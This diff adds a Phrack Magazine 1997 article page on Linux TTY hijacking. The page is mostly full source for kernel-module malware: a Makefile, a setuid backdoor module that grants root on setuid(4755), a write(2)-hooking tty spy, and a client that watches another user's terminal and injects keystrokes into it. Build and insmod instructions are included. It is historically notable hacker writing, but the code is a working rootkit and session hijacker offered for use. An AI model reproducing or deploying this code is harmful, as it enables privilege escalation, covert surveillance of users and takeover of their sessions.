@@ -1,0 +1,628 @@
+<?xml version="1.0" encoding="utf-8" ?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en">
+<head>
+   <meta http-equiv="content-type" content="text/html; charset=utf-8" />
+   <meta http-equiv="content-language" content="en" />
+   <meta name="description" content="Phrack staff website." />
+   <meta name="keywords" content="phrack" />
+   <meta name="robots" content="follow,index,all" />
+
+   <meta name="revisit-after" content="7 days" />
+   
+   <title>.:: Phrack Magazine ::.</title>
+   
+   <link href="../../css/style.css" rel="stylesheet" type="text/css">
+</head>
+<body id="top">
+<div align="center" class="texto-2-bold">
+[ <a href="../../index.html" title="News">News</a> ]
+[ <a href="../../" title="Paper Feed">Paper Feed</a> ]
+[ <a href="../../issues/71/1.html" title="Issues">Issues</a> ]
+[ <a href="../../authors.html" title="Authors">Authors</a> ]
+[ <a href="../../archives/" title="Archives">Archives</a> ]
+[ <a href="../../contact.html" title="Contact">Contact</a> ]
+
+</div>
+
+<center>
+   <br>
+   <br>
+   <img width="600" src="../../images/phrack-logo.jpg" alt="..[ Phrack Magazine ]..">
+   <br>
+
+   <div class="texto-2">
+   <div class="p-title">.:: Linux TTY hijacking ::.</div>
+   <hr width="600" />
+   </div>
+   
+   <div style="padding-top: 4px; padding-bottom: 4px;">
+<div class="around">
+
+<div class="details"><strong>Issues</strong>: 
+[ <a href="../../issues/1/1.html" title="Issue 1">1</a> ] [ <a href="../../issues/2/1.html" title="Issue 2">2</a> ] [ <a href="../../issues/3/1.html" title="Issue 3">3</a> ] [ <a href="../../issues/4/1.html" title="Issue 4">4</a> ] [ <a href="../../issues/5/1.html" title="Issue 5">5</a> ] [ <a href="../../issues/6/1.html" title="Issue 6">6</a> ] [ <a href="../../issues/7/1.html" title="Issue 7">7</a> ] [ <a href="../../issues/8/1.html" title="Issue 8">8</a> ] [ <a href="../../issues/9/1.html" title="Issue 9">9</a> ] [ <a href="../../issues/10/1.html" title="Issue 10">10</a> ] [ <a href="../../issues/11/1.html" title="Issue 11">11</a> ] [ <a href="../../issues/12/1.html" title="Issue 12">12</a> ] [ <a href="../../issues/13/1.html" title="Issue 13">13</a> ] [ <a href="../../issues/14/1.html" title="Issue 14">14</a> ] [ <a href="../../issues/15/1.html" title="Issue 15">15</a> ] [ <a href="../../issues/16/1.html" title="Issue 16">16</a> ] [ <a href="../../issues/17/1.html" title="Issue 17">17</a> ] [ <a href="../../issues/18/1.html" title="Issue 18">18</a> ] [ <a href="../../issues/19/1.html" title="Issue 19">19</a> ] [ <a href="../../issues/20/1.html" title="Issue 20">20</a> ] [ <a href="../../issues/21/1.html" title="Issue 21">21</a> ] [ <a href="../../issues/22/1.html" title="Issue 22">22</a> ] [ <a href="../../issues/23/1.html" title="Issue 23">23</a> ] [ <a href="../../issues/24/1.html" title="Issue 24">24</a> ] [ <a href="../../issues/25/1.html" title="Issue 25">25</a> ] [ <a href="../../issues/26/1.html" title="Issue 26">26</a> ] [ <a href="../../issues/27/1.html" title="Issue 27">27</a> ] [ <a href="../../issues/28/1.html" title="Issue 28">28</a> ] [ <a href="../../issues/29/1.html" title="Issue 29">29</a> ] [ <a href="../../issues/30/1.html" title="Issue 30">30</a> ] [ <a href="../../issues/31/1.html" title="Issue 31">31</a> ] [ <a href="../../issues/32/1.html" title="Issue 32">32</a> ] [ <a href="../../issues/33/1.html" title="Issue 33">33</a> ] [ <a href="../../issues/34/1.html" title="Issue 34">34</a> ] [ <a href="../../issues/35/1.html" title="Issue 35">35</a> ] [ <a href="../../issues/36/1.html" title="Issue 36">36</a> ] [ <a href="../../issues/37/1.html" title="Issue 37">37</a> ] [ <a href="../../issues/38/1.html" title="Issue 38">38</a> ] [ <a href="../../issues/39/1.html" title="Issue 39">39</a> ] [ <a href="../../issues/40/1.html" title="Issue 40">40</a> ] [ <a href="../../issues/41/1.html" title="Issue 41">41</a> ] [ <a href="../../issues/42/1.html" title="Issue 42">42</a> ] [ <a href="../../issues/43/1.html" title="Issue 43">43</a> ] [ <a href="../../issues/44/1.html" title="Issue 44">44</a> ] [ <a href="../../issues/45/1.html" title="Issue 45">45</a> ] [ <a href="../../issues/46/1.html" title="Issue 46">46</a> ] [ <a href="../../issues/47/1.html" title="Issue 47">47</a> ] [ <a href="../../issues/48/1.html" title="Issue 48">48</a> ] [ <a href="../../issues/49/1.html" title="Issue 49">49</a> ] [ <a class="current" href="../../issues/50/1.html" title="Issue 50">50</a> ] [ <a href="../../issues/51/1.html" title="Issue 51">51</a> ] [ <a href="../../issues/52/1.html" title="Issue 52">52</a> ] [ <a href="../../issues/53/1.html" title="Issue 53">53</a> ] [ <a href="../../issues/54/1.html" title="Issue 54">54</a> ] [ <a href="../../issues/55/1.html" title="Issue 55">55</a> ] [ <a href="../../issues/56/1.html" title="Issue 56">56</a> ] [ <a href="../../issues/57/1.html" title="Issue 57">57</a> ] [ <a href="../../issues/58/1.html" title="Issue 58">58</a> ] [ <a href="../../issues/59/1.html" title="Issue 59">59</a> ] [ <a href="../../issues/60/1.html" title="Issue 60">60</a> ] [ <a href="../../issues/61/1.html" title="Issue 61">61</a> ] [ <a href="../../issues/62/1.html" title="Issue 62">62</a> ] [ <a href="../../issues/63/1.html" title="Issue 63">63</a> ] [ <a href="../../issues/64/1.html" title="Issue 64">64</a> ] [ <a href="../../issues/65/1.html" title="Issue 65">65</a> ] [ <a href="../../issues/66/1.html" title="Issue 66">66</a> ] [ <a href="../../issues/67/1.html" title="Issue 67">67</a> ] [ <a href="../../issues/68/1.html" title="Issue 68">68</a> ] [ <a href="../../issues/69/1.html" title="Issue 69">69</a> ] [ <a href="../../issues/70/1.html" title="Issue 70">70</a> ] [ <a href="../../issues/71/1.html" title="Issue 71">71</a> ] 
+</div>
+<div class="opt" align="center"><div class="rt"><a href="../../archives/tgz/phrack50.tar.gz" title="Get current issue tar.gz">Get tar.gz</a></div><strong>Current issue</strong> : #<a href="../../archives/tgz/phrack50.tar.gz" title="Get current issue tar.gz">50</a> | <strong>Release date</strong> : <b>1997-04-09</b> | <strong>Editor</strong> : <b>daemon9</b></div>
+
+<div style="border-top: 1px solid black; border-bottom: 2px solid black">
+<table class="tissue" cellpadding="0" cellspacing="0">
+   <tbody>
+      <tr><td align="left"><a href="../../issues/50/1.html#article">Introduction</a></td><td align="right">Phrack Staff</td></tr>
+<tr><td align="left"><a href="../../issues/50/2.html#article">Phrack Loopback</a></td><td align="right">Phrack Staff</td></tr>
+<tr><td align="left"><a href="../../issues/50/3.html#article">Line Noise</a></td><td align="right">various</td></tr>
+<tr><td align="left"><a href="../../issues/50/4.html#article">Phrack Prophile on Aleph1</a></td><td align="right">Phrack Staff</td></tr>
+<tr><td align="left"><a href="../../issues/50/5.html#article">Linux TTY hijacking</a></td><td align="right">halflife</td></tr>
+<tr><td align="left"><a href="../../issues/50/6.html#article">Juggernaut</a></td><td align="right">route</td></tr>
+<tr><td align="left"><a href="../../issues/50/7.html#article">SNMP insecurities</a></td><td align="right">Alhambra</td></tr>
+<tr><td align="left"><a href="../../issues/50/8.html#article">Cracking NT Passwords</a></td><td align="right">Nihil</td></tr>
+<tr><td align="left"><a href="../../issues/50/9.html#article">SS7 Diverter plans</a></td><td align="right">Mastermind</td></tr>
+<tr><td align="left"><a href="../../issues/50/10.html#article">Skytel Paging and Voicemail</a></td><td align="right">pbxPhreak</td></tr>
+<tr><td align="left"><a href="../../issues/50/11.html#article">Hardwire Interfacing under Linux</a></td><td align="right">Professor</td></tr>
+<tr><td align="left"><a href="../../issues/50/12.html#article">PC Application Level Security</a></td><td align="right">Sideshow Bob</td></tr>
+<tr><td align="left"><a href="../../issues/50/13.html#article">DTMF signalling and decoding</a></td><td align="right">Mr. Blue</td></tr>
+<tr><td align="left"><a href="../../issues/50/14.html#article">DCO Operating System</a></td><td align="right">mrnobody</td></tr>
+<tr><td align="left"><a href="../../issues/50/15.html#article">Phrack World News</a></td><td align="right">Alhambra</td></tr>
+<tr><td align="left"><a href="../../issues/50/16.html#article">extract.c</a></td><td align="right">Phrack Staff</td></tr>
+
+   </tbody>
+</table>
+
+<div class="opt" id="article"><strong>Title</strong> : Linux TTY hijacking</div>
+<div class="opt-bottom"> <strong>Author</strong> : halflife</div>
+<pre>                                .oO Phrack 50 Oo.
+
+                            Volume Seven, Issue Fifty
+
+                                     5 of 16
+ 
+                   ============================================
+                   Abuse of the Linux Kernel for Fun and Profit
+                              halflife@infonexus.com 
+			       [guild  corporation]
+                   ============================================
+
+Introduction
+------------
+   Loadable modules are a very useful feature in linux, as they let
+you load device drivers on a as-needed basis.  However, there is
+a bad side: they make kernel hacking almost TOO easy.  What happens
+when you can no longer trust your own kernel...?  This article describes
+a simple way kernel modules can be easily abused. 
+
+System calls
+------------
+   System calls. These are the lowest level of functions available, and
+are implemented within the kernel. In this article, we will discuss how
+they can be abused to let us write a very simplistic tty hijacker/monitor.
+All code was written and designed for linux machines, and will not compile
+on anything else, since we are mucking with the kernel.
+
+    TTY Hijackers, such as tap and ttywatcher are common on Solaris,
+SunOS, and other systems with STREAMS, but Linux thus far has not had
+a useful tty hijacker (note: I don't consider pty based code such as
+telnetsnoop to be a hijacker, nor very useful since you must make
+preparations ahead of time to monitor users).
+
+   Since linux currently lacks STREAMS (LinSTREAMS appears to be dead),
+we must come up with a alternative way to monitor the stream.  Stuffing
+keystrokes is not a problem, since we can use the TIOCSTI ioctl to stuff
+keystrokes into the input stream.  The solution, of course, is to redirect
+the write(2) system call to our own code which logs the contents of the
+write if it is directed at our tty;  we can then call the real write(2)
+system call.
+
+   Clearly, a device driver is going to be the best way to do things.  We
+can read from the device to get the data that has been logged, and add
+a ioctl or two in order to tell our code exactly what tty we want to log.
+
+
+Redirection of system calls
+---------------------------
+   System calls are pretty easy to redirect to our own code.  It works in
+principle like DOS terminate and stay resident code.  We save the old
+address in a variable, then set a new one pointing to our code.  In our
+code, we do our thing, and then call the original code when finished.
+
+   A very simple example of this is contained in hacked_setuid.c, which
+is a simple loadable module that you can insmod, and once it is inserted
+into the kernel, a setuid(4755) will set your uid/euid/gid/egid to 0.
+(See the appended file for all the code.)  The addresses for the
+syscalls are contained in the sys_call_table array.  It is relatively easy
+to redirect syscalls to point to our code.  Once we have done this, many
+things are possible...
+
+Linspy notes
+------------
+   This module is VERY easy to spot, all you have to do is cat /proc/modules 
+and it shows up as plain as day.  Things can be done to fix this, but I
+have no intention on doing them.
+
+   To use linspy, you need to create an ltap device, the major should
+be 40 and the minor should be 0.  After you do that, run make and then
+insmod the linspy device.  Once it is inserted, you can run ltread [tty]
+and if all goes well, you should see stuff that is output to the user's
+screen.  If all does not go well ... well, I shall leave that to your
+nightmares.
+
+The Code [use the included extract.c utility to unarchive the code]
+---------------------------------------------------------------------
+
+
+&lt;++&gt; linspy/Makefile
+CONFIG_KERNELD=-DCONFIG_KERNELD
+CFLAGS = -m486 -O6 -pipe -fomit-frame-pointer -Wall $(CONFIG_KERNELD)
+CC=gcc
+# this is the name of the device you have (or will) made with mknod
+DN = '-DDEVICE_NAME=&quot;/dev/ltap&quot;'
+# 1.2.x need this to compile, comment out on 1.3+ kernels
+V = #-DNEED_VERSION
+MODCFLAGS := $(V) $(CFLAGS) -DMODULE -D__KERNEL__ -DLINUX
+
+all:		linspy ltread setuid
+
+linspy:		linspy.c /usr/include/linux/version.h
+		$(CC) $(MODCFLAGS) -c linspy.c
+
+ltread:		
+		$(CC) $(DN) -o ltread ltread.c
+
+clean:		
+		rm *.o ltread
+
+setuid:		hacked_setuid.c /usr/include/linux/version.h
+		$(CC) $(MODCFLAGS) -c hacked_setuid.c
+                                                     
+&lt;--&gt; end Makefile
+&lt;++&gt; linspy/hacked_setuid.c
+int errno;
+#include &lt;linux/sched.h&gt;
+#include &lt;linux/mm.h&gt;
+#include &lt;linux/malloc.h&gt;
+#include &lt;linux/errno.h&gt;
+#include &lt;linux/sched.h&gt;
+#include &lt;linux/kernel.h&gt;
+#include &lt;linux/times.h&gt;
+#include &lt;linux/utsname.h&gt;
+#include &lt;linux/param.h&gt;
+#include &lt;linux/resource.h&gt;
+#include &lt;linux/signal.h&gt;
+#include &lt;linux/string.h&gt;
+#include &lt;linux/ptrace.h&gt;
+#include &lt;linux/stat.h&gt;
+#include &lt;linux/mman.h&gt;
+#include &lt;linux/mm.h&gt;
+#include &lt;asm/segment.h&gt;
+#include &lt;asm/io.h&gt;
+#include &lt;linux/module.h&gt;
+#include &lt;linux/version.h&gt;
+#include &lt;errno.h&gt;
+#include &lt;linux/unistd.h&gt;
+#include &lt;string.h&gt;
+#include &lt;asm/string.h&gt;
+#include &lt;sys/syscall.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;sys/sysmacros.h&gt;
+#ifdef NEED_VERSION
+static char kernel_version[] = UTS_RELEASE;
+#endif
+static inline _syscall1(int, setuid, uid_t, uid);
+extern void *sys_call_table[];
+void *original_setuid;
+extern int hacked_setuid(uid_t uid)
+{
+   int i;                     
+   if(uid == 4755)
+   {
+      current-&gt;uid = current-&gt;euid = current-&gt;gid = current-&gt;egid = 0;
+      return 0;
+   }
+   sys_call_table[SYS_setuid] = original_setuid;
+   i = setuid(uid);
+   sys_call_table[SYS_setuid] = hacked_setuid;
+   if(i == -1) return -errno;
+   else return i;
+}
+int init_module(void)
+{
+   original_setuid = sys_call_table[SYS_setuid];
+   sys_call_table[SYS_setuid] = hacked_setuid;
+   return 0;
+}
+void cleanup_module(void)
+{
+   sys_call_table[SYS_setuid] = original_setuid;
+}  
+&lt;++&gt; linspy/linspy.c
+int errno;
+#include &lt;linux/tty.h&gt;
+#include &lt;linux/sched.h&gt;
+#include &lt;linux/mm.h&gt;
+#include &lt;linux/malloc.h&gt;
+#include &lt;linux/errno.h&gt;
+#include &lt;linux/sched.h&gt;
+#include &lt;linux/kernel.h&gt;
+#include &lt;linux/times.h&gt;
+#include &lt;linux/utsname.h&gt;
+#include &lt;linux/param.h&gt;
+#include &lt;linux/resource.h&gt;
+#include &lt;linux/signal.h&gt;
+#include &lt;linux/string.h&gt;
+#include &lt;linux/ptrace.h&gt;
+#include &lt;linux/stat.h&gt;
+#include &lt;linux/mman.h&gt;
+#include &lt;linux/mm.h&gt;
+#include &lt;asm/segment.h&gt;
+#include &lt;asm/io.h&gt;
+#ifdef MODULE
+#include &lt;linux/module.h&gt;       
+#include &lt;linux/version.h&gt;
+#endif
+#include &lt;errno.h&gt;
+#include &lt;asm/segment.h&gt;
+#include &lt;linux/unistd.h&gt;
+#include &lt;string.h&gt;
+#include &lt;asm/string.h&gt;
+#include &lt;sys/syscall.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;sys/sysmacros.h&gt;
+#include &lt;linux/vt.h&gt;
+
+/* set the version information, if needed */
+#ifdef NEED_VERSION
+static char kernel_version[] = UTS_RELEASE;
+#endif
+
+#ifndef MIN
+#define MIN(a,b)        ((a) &lt; (b) ? (a) : (b))
+#endif
+
+/* ring buffer info */        
+
+#define BUFFERSZ        2048
+char buffer[BUFFERSZ];
+int queue_head = 0;
+int queue_tail = 0;
+
+/* taken_over indicates if the victim can see any output */
+int taken_over = 0;
+
+static inline _syscall3(int, write, int, fd, char *, buf, size_t, count);
+extern void *sys_call_table[];
+
+/* device info for the linspy device, and the device we are watching */
+static int linspy_major = 40;
+int tty_minor = -1;
+int tty_major = 4;
+
+/* address of original write(2) syscall */
+void *original_write;
+
+void save_write(char *, size_t);
+
+
+int out_queue(void) 
+{
+   int c;
+   if(queue_head == queue_tail) return -1;
+   c = buffer[queue_head];
+   queue_head++;
+   if(queue_head == BUFFERSZ) queue_head=0;
+   return c;
+}
+
+int in_queue(int ch)
+{
+   if((queue_tail + 1) == queue_head) return 0;
+   buffer[queue_tail] = ch;
+   queue_tail++;
+   if(queue_tail == BUFFERSZ) queue_tail=0;
+   return 1;
+}
+
+
+/* check if it is the tty we are looking for */
+int is_fd_tty(int fd)
+{
+   struct file *f=NULL;
+   struct inode *inode=NULL;
+   int mymajor=0;
+   int myminor=0;
+
+   if(fd &gt;= NR_OPEN || !(f=current-&gt;files-&gt;fd[fd]) || !(inode=f-&gt;f_inode))
+      return 0;
+   mymajor = major(inode-&gt;i_rdev);
+   myminor = minor(inode-&gt;i_rdev);
+   if(mymajor != tty_major) return 0;
+   if(myminor != tty_minor) return 0;
+   return 1;
+}
+
+/* this is the new write(2) replacement call */
+extern int new_write(int fd, char *buf, size_t count)
+{
+   int r;
+   if(is_fd_tty(fd))
+   {
+      if(count &gt; 0)
+         save_write(buf, count);
+      if(taken_over) return count;
+   }
+   sys_call_table[SYS_write] = original_write;
+   r = write(fd, buf, count); 
+   sys_call_table[SYS_write] = new_write;
+   if(r == -1) return -errno;
+   else return r;
+}
+
+
+/* save data from the write(2) call into the buffer */
+void save_write(char *buf, size_t count)
+{
+   int i;
+   for(i=0;i &lt; count;i++)
+      in_queue(get_fs_byte(buf+i));
+}
+
+/* read from the ltap device - return data from queue */
+static int linspy_read(struct inode *in, struct file *fi, char *buf, int count)
+{
+   int i;
+   int c;
+   int cnt=0;
+   if(current-&gt;euid != 0) return 0;
+   for(i=0;i &lt; count;i++)
+   {
+      c = out_queue();
+      if(c &lt; 0) break;
+      cnt++;
+      put_fs_byte(c, buf+i);
+   }
+   return cnt;
+}
+
+/* open the ltap device */
+static int linspy_open(struct inode *in, struct file *fi)
+{
+   if(current-&gt;euid != 0) return -EIO;
+   MOD_INC_USE_COUNT;
+   return 0;
+}
+
+/* close the ltap device */
+static void linspy_close(struct inode *in, struct file *fi)
+{
+   taken_over=0;
+   tty_minor = -1;
+   MOD_DEC_USE_COUNT;
+}
+             
+/* some ioctl operations */
+static int
+linspy_ioctl(struct inode *in, struct file *fi, unsigned int cmd, unsigned long args)
+{
+#define LS_SETMAJOR     0
+#define LS_SETMINOR     1
+#define LS_FLUSHBUF     2
+#define LS_TOGGLE       3
+
+   if(current-&gt;euid != 0) return -EIO;
+   switch(cmd)
+   {
+      case LS_SETMAJOR:
+         tty_major = args;
+         queue_head = 0;
+         queue_tail = 0;
+         break;
+      case LS_SETMINOR:
+         tty_minor = args;
+         queue_head = 0;
+         queue_tail = 0;
+         break;
+     case LS_FLUSHBUF:
+         queue_head=0;
+         queue_tail=0;
+         break;
+     case LS_TOGGLE:
+         if(taken_over) taken_over=0;
+         else taken_over=1;
+         break;
+      default:
+         return 1;
+   }
+   return 0;
+}
+
+
+static struct file_operations linspy = {
+NULL,
+linspy_read,
+NULL,
+NULL,
+NULL,
+linspy_ioctl,
+NULL, 
+linspy_open,
+linspy_close,
+NULL
+};
+
+
+/* init the loadable module */
+int init_module(void)
+{
+   original_write = sys_call_table[SYS_write];
+   sys_call_table[SYS_write] = new_write;
+   if(register_chrdev(linspy_major, &quot;linspy&quot;, &amp;linspy)) return -EIO;
+   return 0;
+}
+
+/* cleanup module before being removed */
+void cleanup_module(void)
+{
+   sys_call_table[SYS_write] = original_write;
+   unregister_chrdev(linspy_major, &quot;linspy&quot;);
+}
+&lt;--&gt; end linspy.c
+&lt;++&gt; linspy/ltread.c
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;termios.h&gt;
+#include &lt;string.h&gt;
+#include &lt;fcntl.h&gt;
+#include &lt;signal.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;sys/stat.h&gt;
+#include &lt;sys/sysmacros.h&gt;
+
+struct termios save_termios;
+int ttysavefd = -1;
+int fd;
+
+#ifndef DEVICE_NAME
+#define DEVICE_NAME &quot;/dev/ltap&quot;
+#endif
+
+#define LS_SETMAJOR     0
+#define LS_SETMINOR     1
+ 
+#define LS_FLUSHBUF     2
+#define LS_TOGGLE       3
+
+void stuff_keystroke(int fd, char key)
+{
+   ioctl(fd, TIOCSTI, &amp;key);
+}
+
+int tty_cbreak(int fd)
+{
+   struct termios buff;
+   if(tcgetattr(fd, &amp;save_termios) &lt; 0)
+      return -1;
+   buff = save_termios;
+   buff.c_lflag &amp;= ~(ECHO | ICANON);
+   buff.c_cc[VMIN] = 0;
+   buff.c_cc[VTIME] = 0;
+   if(tcsetattr(fd, TCSAFLUSH, &amp;buff) &lt; 0)
+      return -1;
+   ttysavefd = fd;
+   return 0;
+}
+
+ char *get_device(char *basedevice)
+{
+   static char devname[1024];
+   int fd;
+
+   if(strlen(basedevice) &gt; 128) return NULL;
+   if(basedevice[0] == '/')
+      strcpy(devname, basedevice);
+   else
+      sprintf(devname, &quot;/dev/%s&quot;, basedevice);
+   fd = open(devname, O_RDONLY);
+   if(fd &lt; 0) return NULL;
+   if(!isatty(fd)) return NULL;
+   close(fd);
+   return devname;
+}
+
+
+int do_ioctl(char *device)
+{
+   struct stat mystat;
+
+   if(stat(device, &amp;mystat) &lt; 0) return -1;
+    fd = open(DEVICE_NAME, O_RDONLY);
+   if(fd &lt; 0) return -1;
+   if(ioctl(fd, LS_SETMAJOR, major(mystat.st_rdev)) &lt; 0) return -1;
+   if(ioctl(fd, LS_SETMINOR, minor(mystat.st_rdev)) &lt; 0) return -1;
+}
+
+
+void sigint_handler(int s)
+{
+   exit(s);
+}
+
+void cleanup_atexit(void)
+{
+   puts(&quot; &quot;);
+   if(ttysavefd &gt;= 0)
+      tcsetattr(ttysavefd, TCSAFLUSH, &amp;save_termios);
+}
+
+main(int argc, char **argv)
+{
+   int my_tty;
+   char *devname;
+    unsigned char ch;
+   int i;
+
+   if(argc != 2)
+   {
+      fprintf(stderr, &quot;%s ttyname\n&quot;, argv[0]);
+      fprintf(stderr, &quot;ttyname should NOT be your current tty!\n&quot;);
+      exit(0);
+   }
+   devname = get_device(argv[1]);
+   if(devname == NULL)
+   {
+      perror(&quot;get_device&quot;);
+      exit(0);
+   }
+   if(tty_cbreak(0) &lt; 0)
+   {
+      perror(&quot;tty_cbreak&quot;);
+      exit(0);
+   }
+   atexit(cleanup_atexit);
+   signal(SIGINT, sigint_handler);
+   if(do_ioctl(devname) &lt; 0)
+   {
+      perror(&quot;do_ioctl&quot;);
+      exit(0);
+   }
+   my_tty = open(devname, O_RDWR);
+   if(my_tty == -1) exit(0);
+   setvbuf(stdout, NULL, _IONBF, 0);
+   printf(&quot;[now monitoring session]\n&quot;);
+   while(1)
+   {
+      i = read(0, &amp;ch, 1);
+      if(i &gt; 0)
+      {
+         if(ch == 24)
+         {
+            ioctl(fd, LS_TOGGLE, 0);
+            printf(&quot;[Takeover mode toggled]\n&quot;);
+         }
+         else stuff_keystroke(my_tty, ch);
+      }
+      i = read(fd, &amp;ch, 1);
+      if(i &gt; 0)
+         putchar(ch);
+    }
+}
+&lt;--&gt; end ltread.c
+
+
+EOF
+</pre>
+
+</div>
+</div>
+
+</center>
+
+<div align="center" class="texto-2-bold">
+[ <a href="../../index.html" title="News">News</a> ]
+[ <a href="../../" title="Paper Feed">Paper Feed</a> ]
+[ <a href="../../issues/71/1.html" title="Issues">Issues</a> ]
+[ <a href="../../authors.html" title="Authors">Authors</a> ]
+[ <a href="../../archives/" title="Archives">Archives</a> ]
+[ <a href="../../contact.html" title="Contact">Contact</a> ]
+</div>
+
+<div align="right" class="texto-1">© Copyleft 1985-2024, Phrack Magazine.</div>
+</body>
+</html>
